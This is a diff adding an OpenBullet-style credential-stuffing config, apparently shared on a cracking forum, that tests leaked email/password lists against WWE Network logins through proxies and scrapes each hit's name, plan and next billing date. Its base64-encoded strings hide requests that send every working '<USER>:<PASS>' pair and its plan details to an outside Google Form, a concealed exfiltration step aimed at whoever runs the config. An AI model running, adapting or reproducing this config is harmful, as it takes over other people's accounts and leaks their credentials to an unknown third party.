@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "WWE @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T10:20:06.8735529+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_WWE REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Login REQUEST POST "https://secure.net.wwe.com/workflow.do" 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Profile" 
+  KEYCHAIN Failure OR 
+    KEY "try again" 
+
+#Nama PARSE "<SOURCE>" LR "title=\"First Name\" value=\"" "\" />" -> VAR "Nama" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xRFVzWXBTUGpVOGxPY3NIMUdoU2luV3NiRVF3XzdhM2JERU50c2dUdVBOSS92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Nama PARSE "<SOURCE>" LR "title=\"Last Name\" value=\"" "\" />" -> CAP "Name" "<Nama> " "" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZUhKNkhIc0VhenljYWh1eTJET3JQWUd0XzBKWmRIclc2TVoyQlBPNXhFWmpUSzdnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Request_Akun REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "You are currently subscribed to" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You are not currently subscribed to" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTYxNjA4NDA1Mj1XV0UmZW50cnkuMTk2Nzc1OTE4Mj08VVNFUj46PFBBU1M+JmVudHJ5LjE1Njg0MzA1NDE9fFBsYW46PFBsYW4+fE5leHQgQmlsbGluZzo8TmV4dCBCaWxsaW5nPnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMjQ4NjkxNjAxNzMzMzI2NTQ5NTclMjIlNUQlMEQlMEEmcGFnZUhpc3Rvcnk9MCZmYnp4PTQ4NjkxNjAxNzMzMzI2NTQ5NTc=" -> VAR "LRU3" 
+
+#Paket PARSE "<SOURCE>" LR "<b>" "</b>." -> CAP "Plan" 
+
+#Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "Network&endDate=" "&" -> CAP "Next Billing" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Billing REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
